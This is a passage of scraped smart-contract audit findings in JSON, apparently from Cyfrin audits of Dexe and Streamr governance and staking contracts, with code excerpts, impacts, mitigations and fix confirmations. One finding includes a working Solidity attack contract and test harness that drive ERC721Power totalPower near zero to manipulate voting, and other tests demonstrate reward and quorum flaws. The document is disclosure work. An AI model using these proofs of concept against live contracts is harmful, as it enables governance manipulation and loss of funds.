        "Of course, Alice could delete the signature by increasing her nonce but it's not a good approach for users to be allowed to use the previous signature."
    ],
    "Impact": [
        " A recovery address might be updated unexpectedly."
    ],
    "Recommended Mitigation": [
        " We should include the current recovery address in the recovery signature.\nThen the previous signature will be invalidated automatically after changing the recovery."
    ],
    "Client": [
        "\nFixed by adding the current recovery address to CHANGE_RECOVERY_ADDRESS_TYPEHASH. Commit: 7826446"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-at-anytime-dramatically-lower-erc721powertotalpower-close-to-0-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function getNftPower(uint256 tokenId) public view override returns (uint256) {\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    // @audit 0 for non-existent tokenId\n    uint256 collateral = nftInfos[tokenId].currentCollateral;\n\n    // Calculate the minimum possible power based on the collateral of the nft\n    // @audit returns default maxPower for non-existent tokenId\n    uint256 maxNftPower = getMaxPowerForNft(tokenId);\n    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));\n    minNftPower = maxNftPower.min(minNftPower);\n\n    // Get last update and current power. Or set them to default if it is first iteration\n    // @audit both 0 for non-existent tokenId\n    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;\n    uint256 currentPower = nftInfos[tokenId].currentPower;\n\n    if (lastUpdate == 0) {\n        lastUpdate = powerCalcStartTimestamp;\n        // @audit currentPower set to maxNftPower which\n        // is just the default maxPower even for non-existent tokenId!\n        currentPower = maxNftPower;\n    }\n\n    // Calculate reduction amount\n    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);\n    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));\n    uint256 newPotentialPower = currentPower - powerReduction;\n\n    // @audit returns newPotentialPower slightly reduced\n    // from maxPower for non-existent tokenId\n    if (minNftPower <= newPotentialPower) {\n        return newPotentialPower;\n    }\n\n    if (minNftPower <= currentPower) {\n        return minNftPower;\n    }\n\n    return currentPower;\n}\n\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    // @audit newPower > 0 for non-existent tokenId\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    // @audit as this is the first update since\n    // tokenId doesn't exist, totalPower will be\n    // subtracted by nft's max power\n    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    // @audit then totalPower is increased by newPower where:\n    // 0 < newPower < maxPower hence net decrease to totalPower\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    nftInfo.currentPower = newPower;\n}\n",
        "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../gov/ERC721/ERC721Power.sol\";\n\nimport \"hardhat/console.sol\";\n\ncontract ERC721PowerAttack {\n    // this attack can decrease ERC721Power::totalPower close to 0\n    //\n    // this attack works when block.timestamp > nftPower.powerCalcStartTimestamp\n    // by taking advantage calling recalculateNftPower for non-existent nfts\n    function attack2(\n        address nftPowerAddr,\n        uint256 initialTotalPower,\n        uint256 lastTokenId,\n        uint256 attackIterations\n    ) external {\n        ERC721Power nftPower = ERC721Power(nftPowerAddr);\n\n        // verify attack starts on the correct block\n        require(\n            block.timestamp > nftPower.powerCalcStartTimestamp(),\n            \"ERC721PowerAttack: attack2 requires block.timestamp > nftPower.powerCalcStartTimestamp\"\n        );\n\n        // verify totalPower() correct at starting block\n        require(\n            nftPower.totalPower() == initialTotalPower,\n            \"ERC721PowerAttack: incorrect initial totalPower\"\n        );\n\n        // output totalPower before attack\n        console.log(nftPower.totalPower());\n\n        // keep calling recalculateNftPower() for non-existent nfts\n        // this lowers ERC721Power::totalPower() every time\n        // can't get it to 0 due to underflow but can get close enough\n        for (uint256 i; i < attackIterations; ) {\n            nftPower.recalculateNftPower(++lastTokenId);\n            unchecked {\n                ++i;\n            }\n        }\n\n        // output totalPower after attack\n        console.log(nftPower.totalPower());\n\n        // original totalPower : 10000000000000000000000000000\n        // current  totalPower : 900000000000000000000000000\n        require(\n            nftPower.totalPower() == 900000000000000000000000000,\n            \"ERC721PowerAttack: after attack finished totalPower should equal 900000000000000000000000000\"\n        );\n    }\n}\n",
        "    describe(\"audit attacker can manipulate ERC721Power totalPower\", () => {\n      it(\"audit attack 2 dramatically lowers ERC721Power totalPower\", async () => {\n        // deploy the ERC721Power nft contract with:\n        // max power of each nft = 100\n        // power reduction 10%\n        // required collateral = 100\n        let maxPowerPerNft = toPercent(\"100\");\n        let requiredCollateral = wei(\"100\");\n        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;\n\n        // create power nft contract\n        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent(\"10\"), requiredCollateral);\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nft.totalPower()).toFixed(), toPercent(\"0\").times(1).toFixed());\n\n        // create the attack contract\n        const ERC721PowerAttack = artifacts.require(\"ERC721PowerAttack\");\n        let attackContract = await ERC721PowerAttack.new();\n\n        // create 10 power nfts for SECOND\n        await nft.safeMint(SECOND, 1);\n        await nft.safeMint(SECOND, 2);\n        await nft.safeMint(SECOND, 3);\n        await nft.safeMint(SECOND, 4);\n        await nft.safeMint(SECOND, 5);\n        await nft.safeMint(SECOND, 6);\n        await nft.safeMint(SECOND, 7);\n        await nft.safeMint(SECOND, 8);\n        await nft.safeMint(SECOND, 9);\n        await nft.safeMint(SECOND, 10);\n\n        // verify ERC721Power::totalPower has been increased by max power for all nfts\n        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());\n\n        // fast forward time to just after the start of power calculation\n        await setTime(powerCalcStartTime);\n\n        // launch the attack\n        await attackContract.attack2(nft.address, maxPowerPerNft.times(10).toFixed(), 10, 91);\n      });\n    });\n"
    ],
    "Description": [
        " Attacker can at anytime dramatically lower ERC721Power::totalPower close to 0 using a permission-less attack contract by taking advantage of being able to call ERC721Power::recalculateNftPower() & getNftPower() for non-existent nfts:"
    ],
    "Impact": [
        " ERC721Power::totalPower lowered to near 0. This can be used to artificially increase voting power since totalPower is read when creating the snapshot and is used as the divisor in GovUserKeeper::getNftsPowerInTokensBySnapshot().",
        "This attack is pretty devastating as ERC721Power::totalPower can never be increased since the currentPower of individual nfts can only ever be decreased; there is no way to \"undo\" this attack unless the nft contract is replaced with a new contract."
    ],
    "Proof of Concept": [
        " Add attack contract mock/utils/ERC721PowerAttack.sol:",
        "Add test harness to ERC721Power.test.js:",
        "Run attack with: npx hardhat test --grep \"audit attack 2 dramatically lowers ERC721Power totalPower\""
    ],
    "Recommended Mitigation": [
        " ERC721Power::recalculateNftPower() should revert when called for non-existent nfts."
    ],
    "Dexe": [
        "\nFixed in PR174."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/distributionproposal-for-voter-rewards-diluted-by-against-voters-and-missing-rewards-permanently-stuck-in-distributionproposal-contract-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      it(\"audit for voter rewards diluted by against voter, remaining rewards permanently stuck in DistributionProposal contract\", async () => {\n        let rewardAmount = wei(\"10\");\n        let halfRewardAmount = wei(\"5\");\n\n        // mint reward tokens to sending address\n        await token.mint(govPool.address, rewardAmount);\n\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [\n            [token.address, 0, getBytesApprove(dp.address, rewardAmount)],\n            [dp.address, 0, getBytesDistributionProposal(1, token.address, rewardAmount)],\n          ],\n          [],\n          { from: SECOND }\n        );\n\n        // only 1 vote \"for\" by SECOND who should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n        // but THIRD votes \"against\", these votes are excluded from getting the reward\n        await govPool.vote(1, false, 0, [6], { from: THIRD });\n\n        // fully fund the proposal using erc20 token\n        await impersonate(govPool.address);\n        await token.approve(dp.address, rewardAmount, { from: govPool.address });\n        await dp.execute(1, token.address, rewardAmount, { from: govPool.address });\n\n        // verify SECOND has received no reward\n        assert.equal((await token.balanceOf(SECOND)).toFixed(), \"0\");\n\n        // claiming the reward releases the erc20 tokens\n        await dp.claim(SECOND, [1]);\n\n        // SECOND only receives half the total reward as the reward is diluted\n        // by the \"against\" vote, even though that vote is excluded from the reward.\n        // as a consequence only half of the reward is paid out to the \"for\" voter when\n        // they should get 100% of the reward since they were the only \"for\" voter and\n        // only \"for\" votes qualify for rewards\n        assert.equal((await token.balanceOf(SECOND)).toFixed(), halfRewardAmount);\n\n        // the remaining half of the reward is permanently stuck\n        // inside the DistributionProposal contract!\n        assert.equal((await token.balanceOf(dp.address)).toFixed(), halfRewardAmount);\n      });\n"
    ],
    "Description": [
        " DistributionProposal only pays rewards to users who voted \"for\" the proposal, not \"against\" it.",
        "But when calculating the reward DistributionProposal::getPotentialReward() the divisor is coreRawVotesFor + coreRawVotesAgainst which represents the total sum of all votes both \"for\" and \"against\", even though votes \"against\" are excluded from rewards.",
        "The effect of this is that rewards to \"for\" voters are diluted by \"against\" voters, even though \"against\" voters don't qualify for the rewards. The missing rewards are permanently stuck inside the DistributionProposal contract unable to ever be paid out.",
        "Attempting to retrieve the rewards by creating a new DistributionProposal fails as the rewards are stuck inside the existing  DistributionProposal contract. Attempting to create a new 2nd \"rescue\" proposal secondProposalId using the existing DistributionProposal contract fails as:",
        "So it doesn't appear possible to rescue the unpaid amount from the first proposal using this strategy. There appears to be no mechanism to retrieve unpaid tokens from the DistributionProposal contract."
    ],
    "Impact": [
        " In every proposal that has both \"for\" and \"against\" voters, the DistributionProposal rewards paid out to \"for\" voters will be less than the total reward amount held by the DistributionProposal contract and the missing balance will be permanently stuck inside the DistributionProposal contract."
    ],
    "Proof of Concept": [
        " Add PoC to DistributionProposal.test.js under section describe(\"claim()\", () => {:",
        "Run with: npx hardhat test --grep \"audit for voter rewards diluted by against voter\""
    ],
    "Recommended Mitigation": [
        " Consider one of the following options:",
        "a) Change the reward calculation divisor to use only coreRawVotesFor.",
        "b) If the intentional design is to allow \"against\" voters to dilute the rewards of \"for\" voters, then implement a mechanism to refund the unpaid tokens from the DistributionProposal contract back to the GovPool contract. This could be done inside DistributionProposal::execute() using a process like:",
        "Note: 2) gets slightly more complicated if the intention is to support fee-on-transfer tokens since the actual amount received by the contract would need to be calculated & used instead of the input amount."
    ],
    "Dexe": [
        "\nFixed in PR174."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/govpooldelegatetreasury-does-not-verify-transfer-of-tokens-and-nfts-to-delegatee-leading-to-potential-voting-manipulation-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function delegateTreasury(\n        address delegatee,\n        uint256 amount,\n        uint256[] calldata nftIds\n    ) external override onlyThis {\n        require(amount > 0 || nftIds.length > 0, \"Gov: empty delegation\");\n        require(getExpertStatus(delegatee), \"Gov: delegatee is not an expert\");\n\n        _unlock(delegatee);\n\n        if (amount != 0) {\n            address token = _govUserKeeper.tokenAddress();\n\n  >          IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals())); //@audit no check if tokens are actually transferred\n\n            _govUserKeeper.delegateTokensTreasury(delegatee, amount);\n        }\n\n        if (nftIds.length != 0) {\n            IERC721 nft = IERC721(_govUserKeeper.nftAddress());\n\n            for (uint256 i; i < nftIds.length; i++) {\n  >              nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]); //-n no check if nft's are actually transferred\n            }\n\n            _govUserKeeper.delegateNftsTreasury(delegatee, nftIds);\n        }\n\n        _revoteDelegated(delegatee, VoteType.TreasuryVote);\n\n        emit DelegatedTreasury(delegatee, amount, nftIds, true);\n    }\n"
    ],
    "Description": [
        " GovPool::delegateTreasury transfers ERC20 tokens & specific nfts from DAO treasury to govUserKeeper. Based on this transfer, the tokenBalance and nftBalance of the delegatee is increased. This allows a delegatee to use this delegated voting power to vote in critical proposals.",
        "As the following snippet of GovPool::delegateTreasury function shows, there is no verification that the tokens and nfts are actually transferred to the govUserKeeper. It is implicitly assumed that a successful transfer is completed and subsequently, the voting power of the delegatee is increased.",
        "This could lead to a dangerous situation where a malicious DAO treasury can increase voting power manifold while actually transferring tokens only once (or even, not transfer at all). This breaks the invariance that the total accounting balances in govUserKeeper contract must match the actual token balances in that contract."
    ],
    "Impact": [
        " Since both the ERC20 and ERC721 token implementations are controlled by the DAO, and since we are dealing with upgradeable token contracts, there is a potential rug-pull vector created by the implicit transfer assumption above."
    ],
    "Recommended Mitigation": [
        " Since DEXE starts out with a trustless assumption that does not give any special trust privileges to a DAO treasury, it is always prudent to follow the \"trust but verify\" approach when it comes to non-standard tokens, both ERC20 and ERC721. To that extent, consider adding verification of token & nft balance increase before/after token transfer."
    ],
    "Dexe": [
        "\nAcknowledged; this finding is about tokens we have no control over. These tokens have to be corrupt in order for safeTransferFrom and transfer functions to not work. With legit tokens everything works as intended."
    ]
}
----End JSON----

https://solodit.xyz/issues/static-govuserkeeper_nftinfototalpowerintokens-used-in-quorum-denominator-can-incorrectly-make-it-impossible-to-reach-quorum-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      it(\"audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator can incorrectly make it impossible to reach quorum\", async () => {\n        // time when nft power calculation starts\n        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n        // required so we can call .toFixed() on BN returned outputs\n        ERC721Power.numberFormat = \"BigNumber\";\n\n        // ERC721Power.totalPower should be zero as no nfts yet created\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings(false);\n\n        // set nftPower as the voting nft\n        // need to comment out check preventing updating existing\n        // nft address in GovUserKeeper::setERC721Address()\n        await impersonate(govPool.address);\n        await userKeeper.setERC721Address(nftPower.address, wei(\"190000000000000000000\"), 1, { from: govPool.address });\n\n        // create a new VOTER account and mint them the only power nft\n        let VOTER = await accounts(10);\n        await nftPower.safeMint(VOTER, 1);\n\n        // switch to using a new ERC20 token for voting; lets us\n        // control exactly who has what voting power without worrying about\n        // what previous setups have done\n        // requires commenting out require statement in GovUserKeeper::setERC20Address()\n        let newVotingToken = await ERC20Mock.new(\"NEWV\", \"NEWV\", 18);\n        await impersonate(govPool.address);\n        await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });\n\n        // mint VOTER some tokens that when combined with their NFT are enough\n        // to reach quorum\n        let voterTokens = wei(\"190000000000000000000\");\n        await newVotingToken.mint(VOTER, voterTokens);\n        await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });\n        await nftPower.approve(userKeeper.address, \"1\", { from: VOTER });\n\n        // VOTER deposits their tokens & nft to have voting power\n        await govPool.deposit(VOTER, voterTokens, [1], { from: VOTER });\n\n        // advance to the approximate time when nft power calculation starts\n        await setTime(powerNftCalcStartTime);\n\n        // verify nft power after power calculation has started\n        let nftTotalPowerBefore = \"900000000000000000000000000\";\n        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);\n\n        // create a proposal which takes a snapshot of the current nft power\n        let proposal1Id = 2;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // vote on first proposal\n        await govPool.vote(proposal1Id, true, voterTokens, [1], { from: VOTER });\n\n        // advance time to allow proposal state change\n        await setTime((await getCurrentBlockTime()) + 10);\n\n        // verify that proposal has reached quorum;\n        // VOTER's tokens & nft was enough to reach quorum\n        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n        // advance time; since VOTER's nft doesn't have collateral deposited\n        // its power will decrement to zero\n        await setTime((await getCurrentBlockTime()) + 10000);\n\n        // call ERC721::recalculateNftPower() for the nft, this will update\n        // ERC721Power.totalPower with the actual current total power\n        await nftPower.recalculateNftPower(\"1\");\n\n        // verify that the true totalPower has decremented to zero as the nft\n        // lost all its power since it didn't have collateral deposited\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // create 2nd proposal which takes a snapshot of the current nft power\n        let proposal2Id = 3;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // vote on second proposal\n        await govPool.vote(proposal2Id, true, voterTokens, [1], { from: VOTER });\n\n        // advance time to allow proposal state change\n        await setTime((await getCurrentBlockTime()) + 10);\n\n        // verify that proposal has not reached quorum;\n        // even though VOTER owns 100% of the supply of the ERC20 voting token,\n        // it is now impossible to reach quorum since the power of VOTER's\n        // ERC20 tokens is being incorrectly diluted through the quorum calculation\n        // denominator assuming the nfts still have voting power.\n        //\n        // this is incorrect as the nft has lost all power. The root cause\n        // is GovUserKeeper::_nftInfo.totalPowerInTokens which is static\n        // but used in the denominator when calculating whether\n        // quorum is reached\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);\n      });\n",
        "       it(\"audit actual power nft voting power doesn't match total nft voting power\", async () => {\n          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n          // required so we can call .toFixed() on BN returned outputs\n          ERC721RawPower.numberFormat = \"BigNumber\";\n\n          // ERC721RawPower::totalPower should be zero as no nfts yet created\n          assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n          // set nftPower as the voting nft\n          // need to comment out check preventing updating existing\n          // nft address in GovUserKeeper::setERC721Address()\n          await impersonate(govPool.address);\n          await userKeeper.setERC721Address(nftPower.address, wei(\"33000\"), 33, { from: govPool.address });\n\n          // create new MASTER & SLAVE accounts\n          let MASTER = await accounts(10);\n          let SLAVE  = await accounts(11);\n\n          // mint MASTER 1 power nft\n          let masterNftId = 1;\n          await nftPower.mint(MASTER, masterNftId, \"\");\n\n          // advance to the approximate time when nft power calculation starts\n          await setTime(powerNftCalcStartTime);\n\n          // verify MASTER's nft has current power > 0\n          let masterNftCurrentPowerStart = (await nftPower.getNftPower(masterNftId)).toFixed();\n          assert.equal(masterNftCurrentPowerStart, \"894960000000000000000000000\");\n          // verify MASTER's nft has minumum power = 0\n          let masterNftMinPowerStart = (await nftPower.getNftMinPower(masterNftId)).toFixed();\n          assert.equal(masterNftMinPowerStart, \"0\");\n\n          // MASTER deposits their nft then delegates it to SLAVE, another address they control\n          await nftPower.approve(userKeeper.address, masterNftId, { from: MASTER });\n          await govPool.deposit(\"0\", [masterNftId], { from: MASTER });\n          await govPool.delegate(SLAVE, \"0\", [masterNftId], { from: MASTER });\n\n          // delegation triggers power recalculation on master's nft. Delegation caches\n          // the minimum possible voting power of master's nft 0 and uses that for\n          // slaves delegated voting power. But recalculation uses the current power\n          // of Master's NFT > 0 to update the contract's total power, and this value\n          // is used in the denominator of the quorum calculation\n          assert.equal((await nftPower.totalPower()).toFixed(), \"894690000000000000000000000\");\n\n          // mint THIRD some voting tokens & deposit them\n          let thirdTokens = wei(\"1000\");\n          await token.mint(THIRD, thirdTokens);\n          await token.approve(userKeeper.address, thirdTokens, { from: THIRD });\n          await govPool.deposit(thirdTokens, [], { from: THIRD });\n\n          // create a proposal\n          let proposalId = 1;\n          await govPool.createProposal(\"\",\n            [[govPool.address, 0, getBytesDelegateTreasury(THIRD, wei(\"1\"), [])]], [], { from: THIRD });\n\n          // MASTER uses their SLAVE account to vote on the proposal; this reverts\n          // as delegation saved the minimum possible voting power of MASTER's nft 0\n          // and uses 0 as the voting power\n          await truffleAssert.reverts(\n            govPool.vote(proposalId, true, 0, [], { from: SLAVE }),\n            \"Gov: low voting power\"\n          );\n\n          // MASTER has the one & only power nft\n          // It has current power   = 894690000000000000000000000\n          // nft.Power.totalPower() = 894690000000000000000000000\n          // This value will be used in the denominator of the quorum calculation\n          // But in practice its actual voting power is 0 since the minumum\n          // possible voting power is used for voting power in delegation, causing\n          // the quorum denominator to be over-inflated\n        });\n",
        "        it(\"audit verified: nft totalPower > 0 when all nfts lost power incorrectly makes it impossible to reach quorum\", async () => {\n          // required so we can call .toFixed() on BN returned outputs\n          ERC721RawPower.numberFormat = \"BigNumber\";\n\n          // time when nft power calculation starts\n          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n          // create a new nft power token with max power same as voting token's\n          // total supply; since we only mint 1 nft this keeps PoC simple\n          let voterTokens = wei(\"190000000000000000000\");\n\n          let newNftPower = await ERC721RawPower.new();\n          await newNftPower.__ERC721RawPower_init(\n            \"NFTPowerMock\",\n            \"NFTPM\",\n            powerNftCalcStartTime,\n            token.address,\n            toPercent(\"0.01\"),\n            voterTokens,\n            \"540\"\n          );\n\n          // ERC721Power.totalPower should be zero as no nfts yet created\n          assert.equal((await newNftPower.totalPower()).toFixed(), \"0\");\n\n          // so proposal doesn't need to go to validators\n          await changeInternalSettings(false);\n\n          // set newNftPower as the voting nft\n          // need to comment out check preventing updating existing\n          // nft address in GovUserKeeper::setERC721Address()\n          await impersonate(govPool.address);\n          // individualPower & supply params not used for power nfts\n          await userKeeper.setERC721Address(newNftPower.address, \"0\", 0, { from: govPool.address });\n\n          // create a new VOTER account and mint them the only power nft\n          let VOTER = await accounts(10);\n          let voterNftId = 1;\n          await newNftPower.mint(VOTER, voterNftId, \"\");\n\n          // switch to using a new ERC20 token for voting; lets us\n          // control exactly who has what voting power without worrying about\n          // what previous setups have done\n          // requires commenting out require statement in GovUserKeeper::setERC20Address()\n          let newVotingToken = await ERC20Mock.new(\"NEWV\", \"NEWV\", 18);\n          await impersonate(govPool.address);\n          await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });\n\n          // mint VOTER some tokens that when combined with their NFT are enough\n          // to reach quorum\n          await newVotingToken.mint(VOTER, voterTokens);\n          await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });\n          await newNftPower.approve(userKeeper.address, voterNftId, { from: VOTER });\n\n          // VOTER deposits their tokens & nft to have voting power\n          await govPool.deposit(voterTokens, [voterNftId], { from: VOTER });\n\n          // advance to the approximate time when nft power calculation starts\n          await setTime(powerNftCalcStartTime);\n\n          // verify nft power after power calculation has started\n          assert.equal((await newNftPower.totalPower()).toFixed(), voterTokens);\n\n          // create a proposal\n          let proposal1Id = 2;\n\n          await govPool.createProposal(\n            \"example.com\",\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n          ,{from : VOTER});\n\n          // vote on first proposal\n          await govPool.vote(proposal1Id, true, voterTokens, [voterNftId], { from: VOTER });\n\n          // advance time to allow proposal state change\n          await setTime((await getCurrentBlockTime()) + 10);\n\n          // verify that proposal has reached quorum;\n          // VOTER's tokens & nft was enough to reach quorum'\n          // since VOTER owns all the voting erc20s & power nfts\n          //\n          // fails here; proposal still in Voting state?\n          assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n          // advance time; since VOTER's nft doesn't have collateral deposited\n          // its power will decrement to zero\n          await setTime((await getCurrentBlockTime()) + 10000);\n\n          // create 2nd proposal\n          let proposal2Id = 3;\n\n          await govPool.createProposal(\n            \"example.com\",\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n          ,{from : VOTER});\n\n          // vote on second proposal\n          await govPool.vote(proposal2Id, true, voterTokens, [voterNftId], { from: VOTER });\n\n          // advance time to allow proposal state change\n          await setTime((await getCurrentBlockTime()) + 10);\n\n          // this used to fail as the proposal would fail to reach quorum\n          // but now it works\n          assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);\n        });\n"
    ],
    "Description": [
        " Consider the following factors:",
        "When voting using ERC721Power nfts where nft power can decrease to zero if nfts don't have the required collateral deposited, this can result in a state where ERC721Power.totalPower() == 0 but GovUserKeeper::_nftInfo.totalPowerInTokens > 0.",
        "Hence the voting power of the ERC20 voting tokens will be incorrectly diluted by the nft's initial voting power GovUserKeeper::_nftInfo.totalPowerInTokens, even though the nfts have lost all voting power.",
        "This can result in a state where quorum is impossible to reach."
    ],
    "Impact": [
        " Quorum can be impossible to reach."
    ],
    "Proof of Concept": [
        " Firstly comment out GovUserKeeper L677 & L690 to allow quickly in-place changing of the voting & nft contracts.",
        "Add PoC to GovPool.test.js under section describe(\"getProposalState()\", () => {:",
        "Run with: npx hardhat test --grep \"audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator\""
    ],
    "Recommended Mitigation": [
        " Change GovUserKeeper::getTotalVoteWeight L573 to use 0 instead of _nftInfo.totalPowerInTokens if IERC721Power(nftAddress).totalPower() == 0.",
        "Consider whether this should be refactored such that the suggested totalPower() == 0 check should not be done against the current totalPower, but against the totalPower saved when the proposal's nft snapshot was created which is stored in GovUserKeeper::nftSnapshot[proposalSnapshotId]."
    ],
    "Dexe": [
        "\nWe are aware of this inflation thing. Unfortunately, this is probably a sacrifice we have to make. Given the business logic of power NFT, we are caught between two stools. Either loops with \"current power\" (which doesn't work for delegatees as potentially the whole supply could be delegated to a single user) or with minimal power and quorum inflation.",
        "The second option seems to be better and much more elegant. Also it incentivises users to add collateral to their NFTs.",
        "\\clearpage"
    ],
    "Cyrin": [
        "\nDuring the mitigations Dexe has performed significant refactoring on the power nfts; what was previously 1 contract has become 3, and the interaction between the power nft voting contracts and GovPool & GovUserKeeper has been significantly changed.",
        "In the new implementation:",
        "The effect of this is that:",
        "Here is a PoC for GovPool.test.js that illustrates this scenario:",
        "Also due to the significant refactoring in this area, here is the updated PoC we used to verify the fix:"
    ]
}
----End JSON----

https://solodit.xyz/issues/wrong-validation-in-defaultundelegationpolicyonundelegate-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "   function onUndelegate(address delegator, uint amount) external {\n       // limitation only applies to the operator, others can always undelegate\n       if (delegator != owner) { return; }\n\n       uint actualAmount = amount < balanceOf(owner) ? amount : balanceOf(owner); //@audit amount:DATA, balanceOf:Operator\n       uint balanceAfter = balanceOf(owner) - actualAmount;\n       uint totalSupplyAfter = totalSupply() - actualAmount;\n       require(1 ether * balanceAfter >= totalSupplyAfter * streamrConfig.minimumSelfDelegationFraction(), \"error_selfDelegationTooLow\");\n   }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In onUndelegate(), it checks if the operator owner still holds at least minimumSelfDelegationFraction of total supply.",
        "But amount means the DATA token amount and balanceOf(owner) indicates the Operator token balance and it's impossible to compare them directly."
    ],
    "Impact": [
        " The operator owner wouldn't be able to undelegate because onUndelegate() works unexpectedly."
    ],
    "Recommended Mitigation": [
        " onUndelegate() should compare amounts after converting to the same token."
    ],
    "Client": [
        " Fixed in commit 9b8c65e."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/malicious-target-can-make-_endvote-revert-forever-by-forceunstakingstaking-again-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "File: contracts\\OperatorTokenomics\\SponsorshipPolicies\\VoteKickPolicy.sol\n179:     function _endVote(address target) internal {\n180:         address flagger = flaggerAddress[target];\n181:         bool flaggerIsGone = stakedWei[flagger] == 0;\n182:         bool targetIsGone = stakedWei[target] == 0;\n183:         uint reviewerCount = reviewers[target].length;\n184:\n185:         // release stake locks before vote resolution so that slashings and kickings during resolution aren't affected\n186:         // if either the flagger or the target has forceUnstaked or been kicked, the lockedStakeWei was moved to forfeitedStakeWei\n187:         if (flaggerIsGone) {\n188:             forfeitedStakeWei -= flagStakeWei[target];\n189:         } else {\n190:             lockedStakeWei[flagger] -= flagStakeWei[target];\n191:         }\n192:         if (targetIsGone) {\n193:             forfeitedStakeWei -= targetStakeAtRiskWei[target];\n194:         } else {\n195:             lockedStakeWei[target] -= targetStakeAtRiskWei[target]; //@audit revert after forceUnstake() => stake() again\n196:         }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In _endVote(), we update forfeitedStakeWei or lockedStakeWei[target] according to the target's staking status.",
        "We consider the target is still active if he has a positive staking amount. But we don't know if he has unstaked and staked again, so the below scenario would be possible.",
        "After all, he won't be flagged again because the current flagging won't be finalized.",
        "Furthermore, malicious operators would manipulate the above state by themselves to earn operator rewards without any risks."
    ],
    "Impact": [
        " Malicious operators can bypass the flagging system by reverting _endVote() forever."
    ],
    "Recommended Mitigation": [
        " Perform stake unlocks in _endVote() without relying on the current staking amounts."
    ],
    "Client": [
        " Fixed in commit 8be1d7e."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-votekickpolicyonflag-targetstakeatriskweitarget-might-be-greater-than-stakedweitarget-and-_endvote-would-revert-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "targetStakeAtRiskWei[target] = max(stakedWei[target], streamrConfig.minimumStakeWei()) * streamrConfig.slashingFraction() / 1 ether;\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " targetStakeAtRiskWei[target] might be greater than stakedWei[target] in onFlag().",
        "For example,"
    ],
    "Impact": [
        " Operators with small staked funds wouldn't be kicked forever."
    ],
    "Recommended Mitigation": [
        " onFlag() should check if a target has staked enough funds for rewards and handle separately if not."
    ],
